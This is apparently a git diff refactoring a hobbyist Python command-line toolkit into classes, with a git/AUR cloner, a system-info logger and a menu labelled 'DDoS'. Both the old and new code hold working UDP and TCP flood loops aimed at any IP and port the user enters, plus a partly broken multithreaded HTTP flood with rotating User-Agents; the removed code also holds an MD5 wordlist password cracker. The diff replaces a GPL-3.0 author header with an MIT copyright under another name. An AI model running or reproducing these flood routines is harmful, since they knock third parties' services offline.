@@ -1,5 +1,5 @@
-# By transcrime
-# GPL-3.0 license
+# Copyright (c) 2026 Nora Rose
+# Licensed under MIT License
 
 import platform
 import psutil
@@ -11,263 +11,357 @@ import socketserver
 import threading
 import requests
 import random
-import sys
+import time
 import json
 import hashlib
+import sys
 from hmac import digest
 from stylelibrary import color
 from stylelibrary import style
-# ASCII Art for dhgs-tool 
-big_text = """
-_░▒███████
-░██▓▒░░▒▓██
-██▓▒░__░▒▓██___██████
-██▓▒░____░▓███▓__░▒▓██
-██▓▒░___░▓██▓_____░▒▓██
-██▓▒░_______________░▒▓██
-_██▓▒░______________░▒▓██
-__██▓▒░____________░▒▓██
-___██▓▒░__________░▒▓██
-____██▓▒░________░▒▓██
-_____██▓▒░_____░▒▓██
-______██▓▒░__░▒▓██
-_______█▓▒░░▒▓██
-_________░▒▓██
-_______░▒▓██
-_____░▒▓██
-█▀▄ █░█ █▀▀ █▀ ▄▄ ▀█▀ █▀█ █▀█ █░░
-█▄▀ █▀█ █▄█ ▄█ ░░ ░█░ █▄█ █▄█ █▄▄
-"""
 
-def main_menu():
- print(color.rgb_text(255,105,180,big_text))
-# This loads and checked if the uername.json file exists if it does it loads the username if not it creates one
- file_path = "username.json"
- if os.path.exists(file_path):
-   with open(file_path, "r") as f:
-     data = json.load(f)
-     username = data.get("username", "")
-     print(f"Welcome back, {style.bold_style(color.rgb_text(255, 105, 180, username))}!")
-     
- else:
-   username = input("Enter your username:")
-   while username == "": #Simple check to make sure username is not empty because it just be weird 
-    print("It seems that your username was empty please re-enter it!")
-    username = input("Enter your username:")
-   with open(file_path, "w") as f: # Creates the username.json and ready to writes the username into it 
-     json.dump({"username": username}, f) # Dumps the username into the json file
-   print(f"Thanks, {username}! Your username has been saved")
+class RepoManager:
+    options = {"1": "Git", "2": "AUR", "3": "Exit"}
 
-#The reason why I rewrite this part, it was a long statement of print repeatedly, instead of some big mess I thought I would put all together make it look cleaner
+    def __init__(self):
+        self.github_base = "https://github.com"
+        self.aur_base = "https://aur.archlinux.org"
+        if platform.system() == "Linux":
+         try:
+            # Only call this on Linux to avoid FileNotFoundError on Windows/macOS
+            self.is_arch = platform.freedesktop_os_release().get("ID") == "arch"
+         except (AttributeError, OSError):
+            self.is_arch = False
+        else:
+        # On Windows or macOS, it's definitely not Arch Linux
+         self.is_arch = False
 
- valid_options = ["1", "2", "3", "4", "5", "6"]
- options = {"1.": "DDoS", "2.": "Hasher", "3.": "Git", "4.": "System Info", "5.": "Change Username", "6.": "Exit"}
- print(color.rgb_text(128,0,128, options))
- choice = input(color.rgb_text(255,105,180,"╰─▸"))
- while choice not in valid_options:
- # it checks if the user choice is in 1 to 5 if not will keep asking for a valid option
-   print("Invalid choice. Please select a valid option.")
-   choice = input(color.rgb_text(255,105,180,"╰─▸ "))
-   #The reason for adding the condition statement, was to make it look cleaner and generally just smaller
- if "1" in choice:
-  Denial_of_Service_type = {"1.": "UPD", "2.": "TCP", "3.": "HTTP"} 
-  print(color.rgb_text(128,0,128,Denial_of_Service_type))
-  choice = input(color.rgb_text(255,105,180,"╰─▸"))
-  if "1" in choice: # UDP is working
-   #def udp_flood(target_ip, ipport):
-      target_ip = input("put in ip --> ")
-      ipport = int(input("now put in ip port --> "))
-      client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #  Socket.AF_INET IS FOR IPv4, Socket.SOCK_DGRAM IS FOR UDP DATAGRAM BASED, CONNECTIONLESS  
-      client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # ALLOWS THE SOCKET TO REUSE A LOCAL ADDRESS (IP AND PORT)
-      packet = os.urandom(5024) # THIS GENERATES 5024 REANDOM BYTES
-      client.sendto(packet, (target_ip, ipport))
-      print(f"Targeting {target_ip}:{ipport} with UDP packet")
+    def client(self):
+     try:
+        while True:
+          print("------------ REPOSITORY ------------")
+          for key, value in self.options.items():
+            print(f"{key}. {value}")
+          print("------------ REPOSITORY ------------")
+          choice = input("╰─▸ ")
+    
+          while choice not in self.options:
+            print(style.bold_style(color.rgb_text(255, 0, 0, "Invalid choice. Please select a valid option.")))
+            print("------------ REPOSITORY ------------")
+            for key, value in self.options.items():
+             print(f"{key}. {value}")
+            print("------------ REPOSITORY ------------")
+            choice = input("╰─▸ ")
+
+          if choice == "1":
+             self.github()
+          if choice == "2":
+             self.aur()
+          if choice == "3" : 
+             break  
+
+     except KeyboardInterrupt:
+         print(style.bold_style(color.rgb_text(255, 165, 0,"\nApplication has been Interrupted body Keyboard")))
+
+    def github(self):
       try:
        while True:
-        client.sendto(packet, (target_ip, ipport))
-        print(f"Packet sent to {target_ip}:{ipport}")
+        print("Please add Persons Github Name | or 'q' to back")
+        github_name = input("╰─▸")
+        if github_name.lower() == "q": break  
+        print("Please add a Repository Name to Started the Git Clone:")
+        repository_name = input("╰─▸")
+        if not repository_name.endswith(".git"):
+         repository_name += ".git" 
+        url = f"{self.github_base}/{github_name}/{repository_name}"
+        result = subprocess.run(["git", "clone", url])
+        if result.returncode == 0:
+         print(style.bold_style(color.rgb_text(0, 255, 0, "Success!")))
+         cd_name_getting = os.path.splitext(repository_name)[0]
+         print(style.bold_style(color.rgb_text(0, 255, 0, f"Successfully directory name, {cd_name_getting}")))
+        else:
+         print(style.bold_style(color.rgb_text(255, 0, 0, "Clone failed.")))
       except KeyboardInterrupt:
-       client.close()
-      main_menu()
-  if "2" in choice: 
-     target_ip = input("IP --> ")
-     ipport = int(input("IP PORT --> "))
-     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Socket.SOCK_STREAM SPECIFICALLY THIS SOCKET WILL USE TCP 
-     print(f"Start attacking on {target_ip}:{ipport}")
-     client.connect((target_ip,ipport))
-     client.send(b"\x10" * 5024)
-     print(f"sending attack {target_ip}:{ipport}") 
+         pass
 
- #for _ in range(5):
+    def aur(self):
      try:
-      while True:
-       client.send(b"\x10" * 5024)
-       print(f"sending attack {target_ip}:{ipport}")
+       while True:   
+        print(style.bold_style(color.rgb_text(255, 165, 0,"Please add a Repository Name to Started the Git Clone | or 'q' to back")))
+        repository_name = input("╰─▸")
+        if repository_name.lower() == "q": break 
+        if not repository_name.endswith(".git"):
+         repository_name += ".git"
+        url = f"{self.aur_base}/{repository_name}"
+        result = subprocess.run(["git", "clone", url])
+        if result.returncode == 0:
+         print(style.bold_style(color.rgb_text(0, 255, 0, "Success!")))
+         cd_name_getting = os.path.splitext(repository_name)[0]
+         print(style.bold_style(color.rgb_text(0, 255, 0, f"Successfully directory name, {cd_name_getting}")))
+         if self.is_arch:
+          subprocess.run(f"cd {cd_name_getting} && ls", shell=True)
+         else:
+           print(style.bold_style(color.rgb_text(255, 0, 0, "You're not on a Arch Linux system")))
+        else:
+         print(style.bold_style(color.rgb_text(255, 0, 0, "Clone failed.")))
      except KeyboardInterrupt:
-      client.close()
-      sys.exit()
-     except ConnectionResetError:
-      print("An existing connection was forcibly closed by the remote host - Most likely done by a firewall or something else")
-  if "3" in choice: # Working progress
-     
- 
-     target_url = input("URL -->")
-     num_threads = int(input("Threads -->"))
-         
-     user_agents = [
-      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-      "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/537.36",
-      "Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
-     ]
-     def send_request():
-      while True:
+        pass
+   
+
+class TrafficGenerator:
+    options = {"1": "UPD", "2": "TCP", "3": "HTTP", "4": "Exit"}
+    def __init__(self):
+     pass
+    def client(self):
+     try:
+        while True:
+          print("------------ ATTACK METHODS ------------")
+          for key, value in self.options.items():
+            print(f"{key}. {value}")
+          print("------------ ATTACK METHODS ------------")
+          choice = input("╰─▸ ")
+          
+          while choice not in self.options:
+            print(style.bold_style(color.rgb_text(255, 0, 0, "Invalid choice. Please select a valid option.")))
+            print("------------ ATTACK METHODS ------------")
+            for key, value in self.options.items():
+             print(f"{key}. {value}")
+            print("------------ ATTACK METHODS ------------")
+            choice = input("╰─▸ ")
+          
+          if choice == "1":
+             self.udp_flood()
+
+          if choice == "2":
+             self.tcp_flood()
+
+          if choice == "3":
+             self.http_flood() 
+
+          if choice == "4":
+             break
+
+
+     except KeyboardInterrupt:
+       print(style.bold_style(color.rgb_text(255, 165, 0,"\nApplication has been Interrupted body Keyboard")))
+
+    def  udp_flood(self):
        try:
-        headers = {"User-Agent": random.choice(user_agents)}
+         while True:
+           target_ip = input("put in ip --> ")
+           ipport = int(input("now put in ip port --> "))
+           client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #  Socket.AF_INET IS FOR IPv4, Socket.SOCK_DGRAM IS FOR UDP DATAGRAM BASED, CONNECTIONLESS  
+           client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # ALLOWS THE SOCKET TO REUSE A LOCAL ADDRESS (IP AND PORT)
+           packet = os.urandom(5024) # THIS GENERATES 5024 REANDOM BYTES
+           client.sendto(packet, (target_ip, ipport))
+           print(f"Targeting {target_ip}:{ipport} with UDP packet")
+           try:
+            while True:
+              client.sendto(packet, (target_ip, ipport))
+              print(f"Packet sent to {target_ip}:{ipport}")
+           except KeyboardInterrupt:
+             client.close()
+       
+       except KeyboardInterrupt:
+        print(style.bold_style(color.rgb_text(255, 165, 0,"\nApplication has been Interrupted body Keyboard")))
 
-        response = requests.get(target_url, headers=headers)
-        print(f"Senting request with {headers}{['User-Agent']}")
-       except requests.exceptions.RequestException:
-        print("Connection failed.")
+    def tcp_flood(self):
+      try:
+       while True:  
+         target_ip = input("IP --> ")
+         ipport = int(input("IP PORT --> "))
+         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Socket.SOCK_STREAM SPECIFICALLY THIS SOCKET WILL USE TCP 
+         print(f"Start attacking on {target_ip}:{ipport}")
+         client.connect((target_ip,ipport))
+         client.send(b"\x10" * 5024)
+         print(f"sending attack {target_ip}:{ipport}") 
+
+     #for _ in range(5):
+         try:
+           while True:
+            client.send(b"\x10" * 5024)
+            print(f"sending attack {target_ip}:{ipport}")
+         except KeyboardInterrupt:
+          client.close()
+         sys.exit()
+      except ConnectionResetError:
+       print("An existing connection was forcibly closed by the remote host - Most likely done by a firewall or something else")
+    def http_flood(self, target_url, num_threads):
+      try:
+        while True:
+          
+         target_url = input("URL -->")
+         num_threads = int(input("Threads -->"))
+         
+         user_agents = [
+           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+           "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/537.36",
+           "Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
+          ]
+        
+      except KeyboardInterrupt:
+         pass
+         def send_request(target_url, num_threads):
+          while True:
+            try:
+              headers = {"User-Agent": random.choice(user_agents)}
+
+              response = requests.get(target_url, headers=headers)
+              print(f"Senting request with {headers}{['User-Agent']}")
+            except requests.exceptions.RequestException:
+              print("Connection failed.")
  
-       for _ in range(num_threads):
-        thread = threading.Thread(target=send_request)
-        thread.start
-        print(F"HTTP FLOOD HAS SHART IT {num_threads} ON {target_url}")     
- if "2" in choice:
-  def hash_password():
-   pass_found=0
+            for _ in range(num_threads):
+             thread = threading.Thread(target=send_request)
+            thread.start
+            print(F"HTTP FLOOD HAS SHART IT {num_threads} ON {target_url}")    
+    
 
-   i_hash = input("Enter the hashed password:") # User have to input MD5 hash of the password
-   p_doc = input("\nEnter password filename inclvding path:")
 
-   p_file = open(p_doc, 'r') # opens the path to the password file and reads it 
+class SecurityToolkit:
+    pass
 
-   for word in p_file:
-      enc_word = word.encode('utf-8')
-      hash_word = hashlib.md5(enc_word.strip())
-      digest = hash_word.hexdigest()
+class Systeminfologging:
+   def __init__(self):
+      self.system_path = "system.json"
+      
+   def logging(self):
+        # System info using platform module
+        print(style.bold_style(color.rgb_text( 0, 0, 255, f"System: {platform.system()}")))
+        print(style.bold_style(color.rgb_text( 0, 0, 255, f"Machine: {platform.machine()}")))
+        print(style.bold_style(color.rgb_text( 0, 0, 255, f"Processor: {platform.processor()}")))
+        print(style.bold_style(color.rgb_text( 0, 0, 255, f"OS Version: {platform.version()}")))
+        print(style.bold_style(color.rgb_text( 0, 0, 255, f"Python version: {platform.python_version()}")))
 
-      if digest == i_hash:
-          print("password found : ", word)
-          pass_found=1
-          main_menu()
+        # CPU info using psutil
+        print(style.bold_style(color.rgb_text( 0, 0, 255,f"CPU cores: {psutil.cpu_count(logical=False)}")))
+        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Logical CPUs: {psutil.cpu_count(logical=True)}")))
+        print(style.bold_style(color.rgb_text( 0, 0, 255,f"CPU usage (%): {psutil.cpu_percent(interval=1)}")))
 
-   if not pass_found:
-      print("password not found")
-      hash_password()
-  hash_password()
- if "3" in choice:
-  repository_type = {"1.": "AUR", "2.": "Git", "3.": "Exit"}    
-  print(color.rgb_text(128,0,128,repository_type))
-  choice = input(color.rgb_text(255,105,180,"╰─▸"))
-  while choice not in ["1", "2", "3"]:
-   print("Invalid choice. Please select a valid option.")
-   choice = input(color.rgb_text(255,105,180,"╰─▸ "))
-  if "1" in choice:
-# repo_url is kind of like a prefix, basically just set the website that it clone, but to be honest I probably could have done better than this idea
-    repo_url = "https://aur.archlinux.org"
-    print("Please add a Repository Name to Started the Git Clone")
-    repository_name = input("╰─▸") 
-# Arch was a lot easier to work with because the AUR does not use usernames just project names which I prefer
-    subprocess.run(["git", "clone", f"{repo_url}/" f"{repository_name}"])
-    cd_name_getting = os.path.splitext(repository_name)[0]
-    print(cd_name_getting) 
-    subprocess.run(f"cd {cd_name_getting} && ls", shell=True)
-# makepkg -is it's currently broken when it's used it says there's no pkg file but there is something went wrong I have to go figure it out
-    subprocess.run(["makepkg", "-is"])  
-  if "2" in choice:
+        # Memory info using psutil
+        memory = psutil.virtual_memory()
+        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Total Memory: {memory.total / (1024 ** 3):.2f} GB")))
+        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Used Memory: {memory.used / (1024 ** 3):.2f} GB")))
+        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Free Memory: {memory.free / (1024 ** 3):.2f} GB")))
 
-    repo_url = "https://github.com"
-# my problem was this one was the usernames and repository names I couldn't find a good way to separate them though I probably could have used split I wasn't sure how to properly do it but it might change it later down the line definitely
-    print("Please add Persons Github Name")
-    github_name = input("╰─▸")   
-    print("Please add a Repository Name to Started the Git Clone:")
-    link_input = input("╰─▸")
-    subprocess.run(["git", "clone", f"{repo_url}/" f"{github_name}/" f"{link_input}"])
-# I have considered trying to make it to automated build but I'm not really sure to do that and I don't want to do it in this project and maybe some separate project 
-    cd_name_getting = os.path.splitext(link_input)[0]
-    print(cd_name_getting)
-  if "3" in choice:
-    print(f"Exiting to main menu. Goodbye! {username}")
-    main_menu()
- if "4" in choice:
-     # System info using platform module
-  print("System:", platform.system())
-  print("Machine:", platform.machine())
-  print("Processor:", platform.processor())
-  print("OS Version:", platform.version())
-  print("Python version:", platform.python_version())
+        # Disk info using psutil
+        disk = psutil.disk_usage('/')
+        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Total Disk Space: {disk.total / (1024 ** 3):.2f} GB")))
+        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Used Disk Space: {disk.used / (1024 ** 3):.2f} GB")))
+        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Free Disk Space: {disk.free / (1024 ** 3):.2f} GB")))
 
- # CPU info using psutil
-  print("CPU cores:", psutil.cpu_count(logical=False))
-  print("Logical CPUs:", psutil.cpu_count(logical=True))
-  print("CPU usage (%):", psutil.cpu_percent(interval=1))
+        # Network info using socket
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Hostname: {hostname}")))
+        print(style.bold_style(color.rgb_text( 0, 0, 255,f"IP Address: {ip_address}")))
 
- # Memory info using psutil
-  memory = psutil.virtual_memory()
-  print(f"Total Memory: {memory.total / (1024 ** 3):.2f} GB")
-  print(f"Used Memory: {memory.used / (1024 ** 3):.2f} GB")
-  print(f"Free Memory: {memory.free / (1024 ** 3):.2f} GB")
+        # Python runtime info using sys
+        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Python executable: {sys.executable}")))
+        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Python version: {sys.version}")))
 
- # Disk info using psutil
-  disk = psutil.disk_usage('/')
-  print(f"Total Disk Space: {disk.total / (1024 ** 3):.2f} GB")
-  print(f"Used Disk Space: {disk.used / (1024 ** 3):.2f} GB")
-  print(f"Free Disk Space: {disk.free / (1024 ** 3):.2f} GB")
+        print(style.bold_style(color.rgb_text( 0, 0, 255,f"Platform: {sys.platform}")))
 
- # Network info using socket
-  hostname = socket.gethostname()
-  ip_address = socket.gethostbyname(hostname)
-  print("Hostname:", hostname)
-  print("IP Address:", ip_address)
+        system_info = {
+          "system": platform.system(),
+          "machine": platform.machine(),
+          "processor": platform.processor(),
+          "os_version": platform.version(),
+          "python_version": platform.python_version(),
+          "cpu_cores": psutil.cpu_count(logical=False),
+          "logical_cpus": psutil.cpu_count(logical=True),
+          "cpu_usage_percent": psutil.cpu_percent(interval=1),
+          "total_memory_gb": memory.total / (1024 ** 3),
+          "used_memory_gb": memory.used / (1024 ** 3),
+          "free_memory_gb": memory.free / (1024 ** 3),
+          "total_disk_space_gb": disk.total / (1024 ** 3),
+          "used_disk_space_gb": disk.used / (1024 ** 3),
+          "free_disk_space_gb": disk.free / (1024 ** 3),
+          "hostname": hostname,
+          "ip_address": ip_address,
+          "python_executable": sys.executable,
+          "python_version_detail": sys.version,
+          "platform": sys.platform
+         }
+        with open(self.system_path, "w") as f:
+         json.dump(system_info, f, indent=4)
+         f.close()
+         print(style.bold_style(color.rgb_text(0, 255, 0, f"System information saved to {self.system_path}")))
 
- # Python runtime info using sys
-  print("Python executable:", sys.executable)
-  print("Python version:", sys.version)
+class SessionManager:
+    def __init__(self):
+       self.file_name = "username.json"
+       self.username = self.load_user()
+       
+    def load_user(self):
+     if os.path.exists(self.file_name):
+       with open(self.file_name, "r") as f:
+           data = json.load(f)
+           self.username = data.get("username", "User")
+     else:
+        name = input("Enter your username:")
+        while name == "":
+          print("It seems that your username was empty please re-enter it!")
+          name = input("Enter your username:")  
+        with open(self.file_name, "w") as f: # Creates the username.json and ready to writes the username into it 
+         json.dump({"username": name}, f) # Dumps the username into the json file
+         print(style.bold_style(color.rgb_text(0, 255, 0, f"Thanks, {name}! Your username has been saved")))
+         return name
+        
+    def change_username(self):
+     if os.path.exists(self.file_name):
+        os.remove(self.file_name)
+        print(style.bold_style(color.rgb_text(255, 0, 0, "The previous username has been removed please add new one")))
+        self.username = self.load_user()
+        
+class Client:
+    
+    def __init__(self):
+        self.repo = RepoManager()
+        self.networking = TrafficGenerator()
+        self.security = SecurityToolkit()
+        self.system_log = Systeminfologging()
+        self.user_session = SessionManager()
 
-  print("Platform:", sys.platform)
+    def client(self):
+        options = {"1": "DDoS", "2": "Hasher", "3": "Git", "4": "System Info", "5": "Change Username", "6": "Exit"}
 
-  file_path = "system_info.json"
-  with open(file_path, "w") as f:
-    system_info = {
-        "system": platform.system(),
-        "machine": platform.machine(),
-        "processor": platform.processor(),
-        "os_version": platform.version(),
-        "python_version": platform.python_version(),
-        "cpu_cores": psutil.cpu_count(logical=False),
-        "logical_cpus": psutil.cpu_count(logical=True),
-        "cpu_usage_percent": psutil.cpu_percent(interval=1),
-        "total_memory_gb": memory.total / (1024 ** 3),
-        "used_memory_gb": memory.used / (1024 ** 3),
-        "free_memory_gb": memory.free / (1024 ** 3),
-        "total_disk_space_gb": disk.total / (1024 ** 3),
-        "used_disk_space_gb": disk.used / (1024 ** 3),
-        "free_disk_space_gb": disk.free / (1024 ** 3),
-        "hostname": hostname,
-        "ip_address": ip_address,
-        "python_executable": sys.executable,
-        "python_version_detail": sys.version,
-        "platform": sys.platform
-    }
-    json.dump(system_info, f, indent=4)
-    print(f"System information saved to {file_path}")
-    main_menu()
- if "5" in choice:
-    remove_file = "username.json"
-    if os.path.exists(remove_file):
-      os.remove(remove_file)
-      print("The previous username has been removed please add new one")
-    while username == "": #Simple check to make sure username is not empty because it just be weird 
-     print("It seems that your username was empty please re-enter it!")
-    username = input("Enter your username:")
-    with open(file_path, "w") as f: # Creates the username.json and ready to writes the username into it 
-     json.dump({"username": username}, f) # Dumps the username into the json file
-    print(f"Thanks, {color.rgb_text(255, 105, 180,username)}! Your username has been saved")
- if "6" in choice:
-    print(f"Exiting the program. Goodbye! {style.bold_style(color.rgb_text(255, 105, 180, username))}")
-    sys.exit()
+        try:
+         while True:
+          print(f"Welcome back, {self.user_session.username}")
+          print("------------ MENU ------------")
+          for key, value in options.items():
+            print(f"{key}. {value}")
+          print("------------ MENU ------------")
+          choice = input("╰─▸ ")
 
-# but this is very early in rework so some things may be changed including comments please be mindful of that and thank you
-main_menu()
+          while choice not in options:
+            print(style.bold_style(color.rgb_text(255, 0, 0, "Invalid choice. Please select a valid option.")))
+            print("------------ MENU ------------")
+            for key, value in options.items():
+             print(f"{key}. {value}")
+            print("------------ MENU ------------")
+            choice = input("╰─▸ ")
+          if choice == "1":
+               self.networking.client()
+          if choice == "3":
+               self.repo.client()
+          if choice == "4":
+             self.system_log.logging()
+          if choice == "5":
+               self.user_session.change_username()
+          if choice == "6":
+             print(style.bold_style(color.rgb_text(0, 255, 0, "Exiting Application Safely....")))
+             time.sleep(1)
+             print(style.bold_style(color.rgb_text(0, 255, 0, "1")))
+             time.sleep(1)
+             print(style.bold_style(color.rgb_text(0, 255, 0, "2")))
+             time.sleep(1)
+             print(style.bold_style(color.rgb_text(0, 255, 0, "3")))
+             break        
+        except KeyboardInterrupt:
+           print(style.bold_style(color.rgb_text(255, 165, 0,"\nApplication has been Interrupted body Keyboard")))
+
+if __name__ == "__main__": 
+    application = Client()
+    application.client()
